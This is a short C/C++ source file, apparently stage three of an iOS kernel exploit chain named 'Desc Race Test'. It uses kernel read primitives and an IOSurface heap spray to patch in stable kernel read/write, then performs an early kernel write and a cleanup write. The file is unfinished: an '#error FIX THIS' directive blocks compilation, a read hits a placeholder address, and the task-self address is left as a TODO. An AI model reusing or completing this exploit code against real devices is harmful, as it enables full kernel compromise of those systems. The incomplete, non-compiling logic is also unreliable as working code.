//
//  stage3.c
//  Desc Race Test
//
//  Created by tihmstar on 05.03.22.
//

#include "stage3.h"
#include "KernelRW.hpp"
#include <unistd.h>

extern "C"{
#include "spray_stuff.h"
};

extern "C" void stage3(uint64_t backupWhere, uint64_t backupWhat){
    KernelRW *newKrw = new KernelRW;


    uint64_t machTaskSelfAddr = 0;
#warning TODO: get machTaskSelfAddr
    /*
        At this point we have a stable kread64 and kread32!
        backupWhere points to real IOSurface object + 0x40
        I'm pretty sure it's possible to get machTaskSelfAddr from travering the IOSurface object, i just don't remember how to do so
     */


#error FIX THIS
    kread32(0x3132333435363738);
    
#warning DEBUG
    while (!machTaskSelfAddr);
    
    printf("getting stable RW primitives\n");
    auto p = newKrw->getPrimitivepatches(kread64, machTaskSelfAddr);
    
    printf("performing write!\n");
    sleep(1);
    early_kwrite64_public(p.where, p.what);
    printf("stable kernel RW now initiated!\n");
    
    if (backupWhere) {
        printf("Detected stage 3 cleanup, performing!\n");
        newKrw->kwrite64(backupWhere, backupWhat);
    }
    
    printf("");
}

